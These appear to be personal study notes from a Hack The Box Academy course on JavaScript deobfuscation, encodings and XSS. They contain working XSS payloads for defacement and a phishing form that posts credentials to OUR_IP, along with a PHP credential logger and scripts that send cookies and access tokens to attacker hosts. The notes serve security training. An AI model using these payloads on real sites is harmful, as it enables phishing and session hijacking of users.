# Locating JavaScript code

- it is presented in the source file with the css style and they both are located in the html code at the source code .

# Intro to Code Obfuscation

  

# How to decode encoded messages

[https://beautifytools.com/javascript-obfuscator.php](https://beautifytools.com/javascript-obfuscator.php)

[https://www.toptal.com/developers/javascript-minifier](https://www.toptal.com/developers/javascript-minifier)

[https://jsconsole.com/](https://jsconsole.com/)

by bassing the .js code in the first then second tool and test the result in the third tool we will be done .

but the problem is that the result will has small things that can be readed so there is a better ways to do that which is by …

## Advanced Obfuscation:

https://obfuscator.io

  

- we will try a couple of tools that should completely obfuscate the code.
- and hide any remanence of its original functionality.

Now, we can paste our code and click `obfuscate`:

[![](https://academy.hackthebox.com/storage/modules/41/js_deobf_obfuscator_1.jpg)](https://academy.hackthebox.com/storage/modules/41/js_deobf_obfuscator_1.jpg)

We get the following code:

Code: javascript

```
var _0x1ec6=['Bg9N','sfrciePHDMfty3jPChqGrgvVyMz1C2nHDgLVBIbnB2r1Bgu='];(function(_0x13249d,_0x1ec6e5){var _0x14f83b=function(_0x3f720f){while(--_0x3f720f){_0x13249d['push'](_0x13249d['shift']());}};_0x14f83b(++_0x1ec6e5);}(_0x1ec6,0xb4));var _0x14f8=function(_0x13249d,_0x1ec6e5){_0x13249d=_0x13249d-0x0;var _0x14f83b=_0x1ec6[_0x13249d];if(_0x14f8['eOTqeL']===undefined){var _0x3f720f=function(_0x32fbfd){var _0x523045='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=',_0x4f8a49=String(_0x32fbfd)['replace'](/=+$/,'');var _0x1171d4='';for(var _0x44920a=0x0,_0x2a30c5,_0x443b2f,_0xcdf142=0x0;_0x443b2f=_0x4f8a49['charAt'](_0xcdf142++);~_0x443b2f&&(_0x2a30c5=_0x44920a%0x4?_0x2a30c5*0x40+_0x443b2f:_0x443b2f,_0x44920a++%0x4)?_0x1171d4+=String['fromCharCode'](0xff&_0x2a30c5>>(-0x2*_0x44920a&0x6)):0x0){_0x443b2f=_0x523045['indexOf'](_0x443b2f);}return _0x1171d4;};_0x14f8['oZlYBE']=function(_0x8f2071){var _0x49af5e=_0x3f720f(_0x8f2071);var _0x52e65f=[];for(var _0x1ed1cf=0x0,_0x79942e=_0x49af5e['length'];_0x1ed1cf<_0x79942e;_0x1ed1cf++){_0x52e65f+='%'+('00'+_0x49af5e['charCodeAt'](_0x1ed1cf)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x52e65f);},_0x14f8['qHtbNC']={},_0x14f8['eOTqeL']=!![];}var _0x20247c=_0x14f8['qHtbNC'][_0x13249d];return _0x20247c===undefined?(_0x14f83b=_0x14f8['oZlYBE'](_0x14f83b),_0x14f8['qHtbNC'][_0x13249d]=_0x14f83b):_0x14f83b=_0x20247c,_0x14f83b;};console[_0x14f8('0x0')](_0x14f8('0x1'));
```

This code is obviously more obfuscated, and we can't see any remnants of our original code. We can now try running it in [https://jsconsole.com](https://jsconsole.com/) to verify that it still performs its original function. Try playing with the obfuscation settings in [https://obfuscator.io](https://obfuscator.io/) to generate even more obfuscated code, and then try rerunning it in [https://jsconsole.com](https://jsconsole.com/) to verify it still performs its original function.

---

## More Obfuscation

Now we should have a clear idea of how code obfuscation works. There  
are still many variations of code obfuscation tools, each of which  
obfuscates the code differently. Take the following JavaScript code, for  
example:

Code: javascript

```
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(!
...SNIP...
[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+[+[]])))()
```

We can still run this code, and it would still perform its original function:

[![](https://academy.hackthebox.com/storage/modules/41/js_deobf_jsf.jpg)](https://academy.hackthebox.com/storage/modules/41/js_deobf_jsf.jpg)

**Note:** The above code was snipped as the full code is too long, but the full code should successfully run.

We can try obfuscating code using the same tool in [JSF](http://www.jsfuck.com/),  
and then rerunning it. We will notice that the code may take some time  
to run, which shows how code obfuscation could affect the performance,  
as previously mentioned.

There are many other JavaScript obfuscators, like [JJ Encode](https://utf-8.jp/public/jjencode.html) or [AA Encode](https://utf-8.jp/public/aaencode.html).  
However, such obfuscators usually make code execution/compilation very  
slow, so it is not recommended to be used unless for an obvious reason,  
like bypassing web filters or restrictions.

# Deobfuscation

---

Now that we understand how code obfuscation works let's start our learning towards deobfuscation.

- Just as there are tools to obfuscate code automatically, there are tools to ==beautify== and ==deobfuscate== the code automatically.
    
    ## Beautify
    
    We see that the current code we have is all written in a single line.
    
    - this called Minified JavaScript code .
    - to deobfuscate a Minified JavaScript code we first need a beutify our code .
    - the most basic way to beutify Minified JavaScript code is through our Browser Dev Tools .
    - you will find your JS script noramly located on the debugger tab in the dev Tools .
    - to get the styled version of this script just press the ‘{ }’ buttun at the end ot the same page not the style editor tab no .
        
        ![[Screenshot_from_2023-09-12_04-06-29.png]]
        
    
    Furthermore, we can utilize many online tools or code editor plugins, like [Prettier](https://prettier.io/playground/) or [Beautifier](https://beautifier.io/). Let us copy the `secret.js` script:
    
    Code: javascript
    
    ```
    eval(function (p, a, c, k, e, d) { e = function (c) { return c.toString(36) }; if (!''.replace(/^/, String)) { while (c--) { d[c.toString(a)] = k[c] || c.toString(a) } k = [function (e) { return d[e] }]; e = function () { return '\\w+' }; c = 1 }; while (c--) { if (k[c]) { p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]) } } return p }('g 4(){0 5="6{7!}";0 1=8 a();0 2="/9.c";1.d("e",2,f);1.b(3)}', 17, 17, 'var|xhr|url|null|generateSerial|flag|HTB|flag|new|serial|XMLHttpRequest|send|php|open|POST|true|function'.split('|'), 0, {}))
    ```
    
    We can see that both websites do a good job in formatting the code:
    
    [![](https://academy.hackthebox.com/storage/modules/41/js_deobf_prettier_1.jpg)](https://academy.hackthebox.com/storage/modules/41/js_deobf_prettier_1.jpg)
    
    [![](https://academy.hackthebox.com/storage/modules/41/js_deobf_beautifier_1.jpg)](https://academy.hackthebox.com/storage/modules/41/js_deobf_beautifier_1.jpg)
    
    However, the code is still not very easy to read. This is because the  
    code we are dealing with was not only minified but obfuscated as well.  
    So, simply formatting or beautifying the code will not be enough. For  
    that, we will require tools to deobfuscate the code.
    

## Deobfuscate

We can find many good online tools to deobfuscate JavaScript code and turn it into something we can understand.

- JSNice : [JSNice](http://www.jsnice.org/) you give the JsNice tool the styled JS script you got from the dev tools and it gives you it deobfusicated
- run it in JSNice by clicking the `Nicify JavaScript` button.

💡

Tips:

Tip: We should click on the options button next to the "Nicify JavaScript" button, and de-select "Infer types" to reduce cluttering the code with comments.

Tip: Ensure you do not leave any empty lines before the script, as it may affect the deobfuscation process and give inaccurate results.

![[Screenshot_from_2023-09-12_04-10-19.png]]

  

  

# Basic Code Analysis

# Sending basic HTTP requests

### XSS Payloads

The most basic method of looking for XSS vulnerabilities is manually  
testing various XSS payloads against an input field in a given web page.  
We can find huge lists of XSS payloads online, like the one on [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) or the one in [PayloadBox](https://github.com/payloadbox/xss-payload-list).  
We can then begin testing these payloads one by one by copying each one  
and adding it in our form, and seeing whether an alert box pops up.

Note: XSS can be injected into any input in the HTML  
page, which is not exclusive to HTML input fields, but may also be in  
HTTP headers like the Cookie or User-Agent (i.e., when their values are  
displayed on the page).

  

# Encoding ::

- base64
    
    - used to reduce the use of special characters
    - it contains numbers and letters and plus and divided only
    - base 64 : dont contain any special characters or signs except the pluse and divided as i said before .
    - we spot base 64 encoding by the concept of it containing only numbers and letters and it may contain / , +
    - the length of of base64 encrypted strings has to be in a multiple of 4 in another words count the string.length and divide it by 4 if there is no reminder then it is correct .
    - If the resulting output is only 3 characters long, for example, an extra `=` is added as padding, and so on.
    
    - To encode any text into `base64` in Linux, we can echo it and pipe it with '`|`' to `base64`:
        
        Base64 Encode
        
        ```
        KareemAlsadeq@htb[/htb]$ echo https://www.hackthebox.eu/ | base64aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8K
        ```
        
    
    to decode base64 string use :
    
    ```
    echo asdfjklasdfsd | base64 -d 
    ```
    
      
    
- Hex
    
    - hex encoding method .
    - hex encoding is just
        - encoding each character into its hex order in the ASCII
        - for example
            - a → 61
            - b → 62
            - c → 63
            - and so on .
    - You can find the full `ASCII` table in Linux using the `man ascii` command.
    - to encrypt any string into hex encoded then using our terminal .
        - `echo ahmed | xxd -p`
    
    echo ahmed | xxd -p
    
    61686d65640a
    
      
    
      
    
    - to decode a Hex encoded string we will use the reverse flag -r after the flag -p
    - `echo 61686d65640a | xxd -p -r`
    - ### Spotting Hex
        
        Any string encoded in `hex` would be comprised of hex characters only, which are 16 characters only: 0-9 and a-f. That makes spotting `hex` encoded strings just as easy as spotting `base64` encoded strings.
        
    
      
    
      
    
      
    
      
    
- caesar/Rot13
    
    ### Rot13 Encode
    
    There isn't a specific command in Linux to do `rot13` encoding. However, it is fairly easy to create our own command to do the character shifting:
    
    Rot13 Encode
    
    ```
    KareemAlsadeq@htb[/htb]$ echo https://www.hackthebox.eu/ | tr 'A-Za-z' 'N-ZA-Mn-za-m'uggcf://jjj.unpxgurobk.rh/
    ```
    
    ### Rot13 Decode
    
    We can use the same previous command to decode rot13 as well:
    
    Rot13 Decode
    
    ```
    KareemAlsadeq@htb[/htb]$ echo uggcf://jjj.unpxgurobk.rh/ | tr 'A-Za-z' 'N-ZA-Mn-za-m'https://www.hackthebox.eu/
    ```
    
    - Another option to encode/decode rot13 would be using an online tool, like [rot13](https://rot13.com/).

  

  

  

  

- Some tools can help us automatically determine the type of encoding, like [Cipher Identifier](https://www.boxentriq.com/code-breaking/cipher-identifier). Try the encoded strings above with [Cipher Identifier](https://www.boxentriq.com/code-breaking/cipher-identifier), to see if it can correctly identify the encoding method.

## website defacing attacks

- defacement or defacing is to change the face of a website to change how it looks like to tell people that they hacked the website de_facing .
- Ways with JS to deface a website …
    - Background Color `document.body.style.background`
    - Background `document.body.background`
    - Page Title `document.title`
    - Page Text `DOM.innerHTML`
        
        ```
        <div></div><ul class="list-unstyled" id="todo"><ul><script>document.body.style.background = "\#141d2b"</script></ul><ul><script>document.title = 'HackTheBox Academy'</script></ul><ul><script>document.getElementsByTagName('body')[0].innerHTML = '...SNIP...'</script></ul></ul>
        ```
        
          
        

## Phishing :

- to remove an html object via a JS payload use this command
    - in case the object’s id is urlform and we want to remove it :
        
        ```
        document.getElementById('urlform').remove();
        ```
        
          
        
- to make a html page and access it via the maliciouse page or another words to make html object in the page via a reflected xss payload use :
    
    ```
    document.write('here write the html code for a page like facebook or google as an example');
    ```
    
    if you want to add anther payload in the same line of code at the same <script></script> then just end each command by a semicolon .
    
    like this
    
    will creat a html login form to phish the target; and also it will delete the url input place to force him to login to use the url input place
    
    ```
    document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
    ```
    
    ```
    http://10.129.112.223/phishing/index.php?url='><script>alert(window.origin)</script><"
    ```
    
    ```
    <?php
    if (isset($_GET['username']) && isset($_GET['password'])) {
        $file = fopen("creds.txt", "a+");
        fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
        header("Location: http://SERVER_IP/phishing/index.php");
        fclose($file);
        exit();
    }
    ?>
    ```
    

## session hijacking:

- session hijacking = stealing .

- **Loading a Remote Script:**
    
    ```
    <script src="http://ourIP/script.js"></script>
    ```
    
    this payload is via link
    
    to our JavaScript file
    
    - so for our situation we don't knew which input part is the part that contains the xss vulnerability so
    - we will do a clever thing we will go and make a link with each of the inputs name and for each one of the inputs part we will send it a link with its name and wait to see which of them is the one that responded and asked for the file that is called with its name and we will wait at our listener.
    
    There are multiple JavaScript payloads we can use to grab the session cookie and send it to us, as shown by [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc):
    
    Code: javascript
    
    ```
    document.location='http://OUR_IP/index.php?c='+document.cookie;
    new Image().src='http://OUR_IP/index.php?c='+document.cookie;
    ```
    
    or we can use it from the payloadsallthethings but rember to change the link to be http://OUR_IP/index.php?c=
    
    ```
    <script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
    <script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
    <script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
    <script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
    ```
    
      
    

## XSS Prevention: